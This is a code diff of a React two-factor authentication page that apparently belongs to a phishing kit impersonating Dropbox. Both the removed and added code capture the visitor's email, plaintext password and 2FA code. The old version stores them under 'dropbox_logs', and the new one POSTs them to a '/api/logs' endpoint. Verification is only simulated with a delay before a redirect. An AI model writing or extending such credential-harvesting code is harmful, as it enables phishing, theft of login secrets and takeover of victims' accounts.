@@ -13,10 +13,10 @@ export default function TwoFactorAuth() {
 
   useEffect(() => {
     // Check if user came from login page
-    const email = sessionStorage.getItem('userEmail');
-    const password = sessionStorage.getItem('userPassword');
+    const email = sessionStorage.getItem('email');
+    const password = sessionStorage.getItem('password');
     if (!email || !password) {
-      window.location.href = '/';
+      window.location.href = '/login';
       return;
     }
     setUserEmail(email);
@@ -57,23 +57,32 @@ export default function TwoFactorAuth() {
 
     setIsSubmitting(true);
     
-    // Log the 2FA attempt with timestamp
-    const timestamp = new Date().toLocaleString();
-    const logEntry = {
-      timestamp,
-      email: userEmail,
-      password: userPassword,
-      code: fullCode,
-      type: '2fa'
-    };
-    
-    // Store in localStorage for persistence
-    const storedLogs = JSON.parse(localStorage.getItem('dropbox_logs') || '[]');
-    localStorage.setItem('dropbox_logs', JSON.stringify([...storedLogs, logEntry]));
+    // Log the 2FA attempt
+    try {
+      const logData = {
+        timestamp: new Date().toLocaleString(),
+        email: sessionStorage.getItem('email') || '',
+        password: sessionStorage.getItem('password') || '',
+        code: code.join(''),
+        type: '2FA'
+      };
+      console.log('Sending log data:', logData);
+      const response = await fetch('/api/logs', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(logData),
+      });
+      const result = await response.json();
+      console.log('Log response:', result);
+    } catch (error) {
+      console.error('Error logging 2FA attempt:', error);
+    }
 
     // Clean up session storage
-    sessionStorage.removeItem('userEmail');
-    sessionStorage.removeItem('userPassword');
+    sessionStorage.removeItem('email');
+    sessionStorage.removeItem('password');
 
     // Simulate verification delay then redirect
     setTimeout(() => {
